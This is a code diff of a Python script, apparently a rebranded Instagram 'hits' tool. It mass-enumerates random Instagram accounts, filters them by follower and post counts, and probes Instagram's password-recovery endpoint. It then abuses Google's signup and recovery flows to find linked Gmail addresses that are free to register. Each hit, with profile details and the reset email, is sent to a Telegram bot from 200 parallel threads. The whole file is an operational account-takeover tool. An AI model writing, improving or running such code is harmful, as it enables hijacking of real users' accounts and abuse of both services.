@@ -1,4 +1,3 @@
-print('SENPAI X ZOYA META TOOL THIS IS YOUR PERMENENT FILE OPEN SOURCE HI HAI TO DECODER MAJDURI NA KRE 🤣')
 import os
 import sys
 import re
@@ -17,6 +16,11 @@ from random import choice, randrange
 from cfonts import render, say
 from colorama import Fore, Style, init
 import webbrowser
+
+# --- CONFIGURATION (Updated Filters) ---
+MIN_FOLLOWERS = 20 # Minimum Followers set to 20
+MIN_POSTS = 1      # Minimum Posts set to 1
+
 
 init(autoreset=True)
 
@@ -40,17 +44,8 @@ CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
 CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
 
 TOKEN_FILE = 'tl.txt'
-nior_domain = '@gmail.com'
-red = "\033[1m\033[31m"
-green = "\033[1m\033[32m"
-yellow = "\033[1m\033[33m"
-blue = "\033[1m\033[34m"
-cyan = "\033[1m\033[36m"
-magenta = "\033[1m\033[35m"
-M = "\033[1m\033[36m"
-white = "\033[1m\033[37m"
-orange = "\033[1m\033[38;5;208m"
-reset = "\033[0m"
+eizon_domain = '@gmail.com' 
+
 P = '\x1b[1;97m'
 B = '\x1b[1;94m'
 O = '\x1b[1;96m'
@@ -73,14 +68,14 @@ P1 = '\x1b[38;5;150m'
 P2 = '\x1b[38;5;190m'
 E = '\033[1;31m'
 Y = '\033[1;33m'
-Z = '\033[1;31m'
-X = '\033[1;33m'
-Z1 = '\033[2;31m'
-F = '\033[2;32m'
+Z = '\033[1;31m' 
+X = '\033[1;33m' 
+Z1 = '\033[2;31m' 
+F = '\033[2;32m' 
 A = '\033[2;34m'
-C = '\033[2;35m'
+C = '\033[2;35m' 
 S = '\033[2;36m'
-G = '\033[1;34m'
+G = '\033[1;34m' 
 M = '\x1b[1;37m'
 B = '\x1b[1;37m'
 
@@ -91,72 +86,28 @@ bad_email = 0
 good_ig = 0
 infoinsta = {}
 
-def logo():
-    print(f'{blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    yuvi = render("SENPAI X ZOYA", colors=["cyan", "yellow"], align="center")
-    print(yuvi)
-    print(f'{blue}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    x=f" 𝙨𝙚𝙣𝙥𝙖𝙞 𝙭 𝙯𝙤𝙮𝙖 𝙣𝙚𝙬 𝙘𝙤𝙡𝙡𝙖𝙗 𝙩𝙤𝙤𝙡 𝙢𝙪𝙨𝙩 𝙗𝙚 𝙜𝙞𝙫𝙚 𝙧𝙚𝙫𝙞𝙚𝙬🤭\n"
-    for i in x:
-        print(i,end='',flush=True)
-        time.sleep(0.06)
-    os.system('cls' if os.name=='nt' else 'clear')
-logo()
-print(f"{yellow}Enter Chat id and Bot token")
+banner = render('{senpai}', colors=['white', 'blue'], align='center')
+print(f'''
+\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+                      {banner}
+\033[2;36m CHANNEL : @senpai_era| DEV : @jaorg
+\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+''')
 
-ID = input("Chat ID: ")
+ID = input('\033[1;33m -  𝐈𝐃 : ')
 print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-TOKEN = input("Enter Token: ")
+TOKEN = input('\033[1;33m - 𝐓𝐨𝐤𝐞𝐧 : ')
 os.system('clear')
 
-def text(bot_token, chat_id):
-    message = f"⛔️Welcome to senpai tool user \nThanks for using Our file..."
-
-    url=f"https://api.telegram.org/bot{bot_token}/sendMessage"
-
-    keyboard = {
-        "inline_keyboard": [
-            [
-                {"text": "👨‍💻 dev 1", "url": "https://t.me/jaorg"},
-                {"text": " 👨‍💻 dev 2", "url": "https://t.me/zoyazi"}
-                
-            ]
-        ]
-    }
-
-    payload = {
-        "chat_id": chat_id,
-        "text": message,
-        "reply_markup": keyboard
-    }
-
-    response = requests.post(url, json=payload)
-
-    if response.status_code == 200:
-        print("✅Bot is activated")
-    else:
-        print("Failed to Activate Bot:", response.text)
-
-    time.sleep(2)
-text(TOKEN,ID)
 
 
-print(f'{red}Use Vpn if file got stucked')
-time.sleep(2)
-def update_stats(email):
-    sysdontwrite = (
-        f"{C1}Hits{P1}       : {hits}\n"
-        f"{Z}Bad IG{P}     : {J21}{bad_insta}\n"
-        f"{Z}Bad Email{B}  : {J21}{bad_email}\n"
-        f"{P}Good IG{Z}    : {J21}{good_ig}\n"
-        f"Email         : {J22}{email}\n"
-        f"{yellow}By @jaorg |@zoyazi{white}"
-    )
+def update_stats():
+    # @aryan ;
+    sysdontwrite = f"""\r{C1}Hits{P1} : {hits}{J21} |{Z} Bad IG{P} : {J21}{bad_insta}{P} | {Z}Bad Email{B} : {J21}{bad_email}{Z} | {P}Good IG{Z} : {J21}{good_ig}"""
     sys.stdout.write(sysdontwrite)
     sys.stdout.flush()
 
-
-def nior():
+def Eizon():
     try:
         alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
         n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
@@ -172,10 +123,18 @@ def nior():
         recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                         "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
         res1 = requests.get(recovery_url, headers=headers)
-        tok = re.search(
+        
+        # Using a more robust regex check
+        match = re.search(
             'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
             res1.text
-        ).group(2)
+        )
+        if match:
+             tok = match.group(2)
+        else:
+            # Fallback or retry if token extraction fails
+            raise ValueError("Token not found in response.")
+
         cookies = {'__Host-GAPS': host}
         headers2 = {
             AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
@@ -184,7 +143,8 @@ def nior():
             CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
             'google-accounts-xsrf': '1',
             ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
-            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
+            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
+                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
             USER_AGENT_HEADER: generate_user_agent()
         }
         data = {
@@ -199,10 +159,9 @@ def nior():
         with open(TOKEN_FILE, 'w') as f:
             f.write(f"{token_line}//{host}\n")
     except Exception as e:
-        print(e)
-        nior()
+        Eizon()
 
-nior()
+Eizon()
 
 def check_gmail(email):
     global bad_email, hits
@@ -234,13 +193,13 @@ def check_gmail(email):
                       params=params, cookies=cookies, headers=headers, data=data)
         if '"gf.uar",1' in response.text:
             hits += 1
-            update_stats(email)
-            full_email = email + nior_domain
+            update_stats()
+            full_email = email + eizon_domain
             username, domain = full_email.split('@')
             InfoAcc(username, domain)
         else:
             bad_email += 1
-            update_stats(email)
+            update_stats()
     except Exception:
         pass
 
@@ -267,14 +226,17 @@ def check(email):
         IG_SIG_KEY_VERSION: '4'
     }
     response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
+    
+    # Instagram recovery check
     if email in response:
-        if nior_domain in email:
-            check_gmail(email)
         good_ig += 1
-        update_stats(email)
+        update_stats()
+        # If Instagram account exists, now check if the Gmail is available
+        if eizon_domain in email:
+            check_gmail(email)
     else:
         bad_insta += 1
-        update_stats(email)
+        update_stats()
 
 def rest(user):
     try:
@@ -290,7 +252,8 @@ def rest(user):
             'X-IG-Connection-Type': 'WIFI',
             'X-IG-Capabilities': '3brTvw==',
             'X-IG-App-ID': '567067343352427',
-            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
+            USER_AGENT_HEADER: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
+                                '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                 'en_GB; 161478664)'),
             'Accept-Language': 'en-GB, en-US',
             COOKIE_HEADER: COOKIE_VALUE,
@@ -311,72 +274,101 @@ def rest(user):
             IG_SIG_KEY_VERSION: '4'
         }
         response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).json()
-        niorporno = response.get('email', 'Reset None')
+        eizonporno = response.get('email', 'Reset None')
     except:
-        niorporno = 'Reset None'
-    return niorporno
+        eizonporno = 'Reset None'
+    return eizonporno
 
 def date(hy):
+    """Calculates registration year based on Instagram user ID range."""
     try:
-        ranges = [
-            (1279000, 2010),
-            (17750000, 2011),
-            (279760000, 2012),
-            (900990000, 2013),
-            (1629010000, 2014),
-            (2500000000, 2015),
-            (3713668786, 2016),
-            (5699785217, 2017),
-            (8597939245, 2018),
-            (21254029834, 2019),
-        ]
-        for upper, year in ranges:
-            if hy <= upper:
-                return year
-        return 2023
-    except Exception:
-        pass
+        hy = int(hy)
+    except:
+        return 'N/A'
+        
+    ranges = [
+        (1279000, 2010),
+        (17750000, 2011),
+        (279760000, 2012),
+        (900990000, 2013),
+        (1629010000, 2014),
+        (2500000000, 2015),
+        (3713668786, 2016),
+        (5699785217, 2017),
+        (8597939245, 2018),
+        (21254029834, 2019),
+        (43464475395, 2020),
+        (50289297647, 2021),
+        (57464707082, 2022),
+        (63313426938, 2023),
+    ]
+    
+    for upper, year in sorted(ranges):
+        if hy <= upper:
+            return year
+    return "2024+"
 
 def InfoAcc(username, domain):
-    global total_hits
+    global total_hits, MIN_FOLLOWERS, MIN_POSTS, ID, TOKEN
     account_info = infoinsta.get(username, {})
-    user_id = account_info.get('pk')
-    full_name = account_info.get('full_name')
-    followers = account_info.get('follower_count')
-    following = account_info.get('following_count')
-    posts = account_info.get('media_count')
-    bio = account_info.get('biography')
+    
+    # --- Data Extraction and Validation ---
+    user_id = account_info.get('pk', 'N/A')
+    followers = account_info.get('follower_count', 0)
+    posts = account_info.get('media_count', 0)
+    
+    # 💥 APPLY FOLLOWERS AND POSTS FILTER HERE 💥
+    try:
+        # Check if the account meets the minimum followers and posts criteria
+        if int(followers) < MIN_FOLLOWERS or int(posts) < MIN_POSTS:
+            return # Hit discard if filters are not met
+    except:
+        return
+
+    # --- Data Formatting ---
     total_hits += 1
+    full_name = account_info.get('full_name', 'N/A')
+    following = account_info.get('following_count', 'N/A')
+    bio = account_info.get('biography', 'No bio')
+    reg_date = date(user_id)
+    reset_email = rest(username)
+    
     info_text = f"""
-[♥][♦]𝙮𝙤𝙪𝙧 𝙝𝙞𝙩[♣][♠]
-✦✧✧✧✧✦✦✧✧✧✧✦
-𝒉𝑖𝑡 : [ {total_hits}  ]
-𝑢𝑠𝑒𝑟 𝑛𝑎𝑚𝑒 : [ {username} ]
-𝑒𝑚𝑎𝑖𝑙 : [ {username}@{domain} ]
-𝑓𝑜𝑙𝑙𝑜𝑤𝑒𝑟𝑠 : [ {followers} ]
-𝑓𝑜𝑙𝑙𝑜𝑤𝑖𝑛𝑔 : [ {following} ]
-𝑝𝑜𝑠𝑡𝑠 : [ {posts} ]
-𝑑𝑎𝑡𝑒 : [ ? ]
-𝑏𝑖𝑜 : [ {bio} ]
-𝑟𝑒𝑠𝑒𝑡 : [ {rest(username)} ]
-✦✧✧✧✧✦✦✧✧✧✧✦
-By @jaorg || @zoyazi
+╭━─━─━─━─━─━─━─━─━─━─━─━─━╮
+┃      ⚔️ 𝐒 𝐄 𝐍 𝐏 𝐀 𝐈   𝐄 𝐑 𝐀 ⚔️      ┃
+╰━─━─━─━─━─━─━─━─━─━─━─━─━╯
+╺─────────────────────────────────────╸
+
+ ⭐ 𝗛𝗜𝗧𝗦           | {stats[total_hits]}
+ ─────────────────────────────────────
+ 👾 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘        | [ {username} ]
+ 📧 𝗘𝗠𝗔𝗜𝗟          | [ {username}@{domain} ]
+ 👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦       | [ {followers} ]
+ 🚶 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚        |[ {following} ]
+ 🗓️ 𝗬𝗘𝗔𝗥           |[ {reg_date} ]
+ 📝 𝗕𝗜𝗢            |[ {bio} ]
+ 🔑 𝗥𝗘𝗦𝗘𝗧 𝗟𝗜𝗡𝗞      |[ {reset_email} ]
+ 🌐 𝗜𝗚 𝗟𝗜𝗡𝗞         | [ www.instagram.com/{username} ]
+
+╺─────────────────────────────────────╸
+   ©️ 𝖣𝖤𝖵𝖫𝖮𝖯𝖤𝖱 : @senpai_era | 𝖳𝖤𝖠𝖬 : @senpai_era
 """
-    with open('niorhits.txt', 'a') as f:
+    with open('senpai.txt', 'a') as f:
         f.write(info_text + "\n")
     try:
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
-        print(info_text)
-
+        # Send Telegram message
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
+                     params={'chat_id': ID, 'text': info_text, 'parse_mode': 'HTML'})
     except Exception:
         pass
 
-def nior_python():
+def eizon_python():
     while True:
         data = {
             'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
             'variables': json.dumps({
-                'id': int(random.randrange(2500000000, 21254029999)),
+                # Random ID generation range
+                'id': int(random.randrange(900990000, 50289297647)),
                 'render_surface': 'PROFILE'
             }),
             'doc_id': '25618261841150840'
@@ -384,18 +376,30 @@ def nior_python():
         headers = {'X-FB-LSD': data['lsd']}
         try:
             response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
-            response_json = response.json()
-            user_data = response_json.get('data', {}).get('user', {})
             account = response.json().get('data', {}).get('user', {})
             username = account.get('username')
-            follower_count = user_data.get('follower_count', 0)
-            if username and follower_count>=25:
+            
+            if username:
+                # Store full account info right after fetching
                 infoinsta[username] = account
-                emails = [username + nior_domain]
-                for email in emails:
-                    check(email)
+                
+                # Check for minimum posts/followers before doing the expensive email check
+                followers = account.get('follower_count', 0)
+                posts = account.get('media_count', 0)
+                
+                if int(followers) >= MIN_FOLLOWERS and int(posts) >= MIN_POSTS:
+                    emails = [username + eizon_domain]
+                    for email in emails:
+                        # This check function performs the Instagram recovery check
+                        # and then calls check_gmail/InfoAcc if successful.
+                        check(email) 
+                        
         except Exception:
             pass
 
-for _ in range(120):
-    Thread(target=nior_python).start()
+# Rerunning Eizon to ensure the token is fresh with the new logic
+Eizon()
+
+for _ in range(200):
+    Thread(target=eizon_python).start()
+    
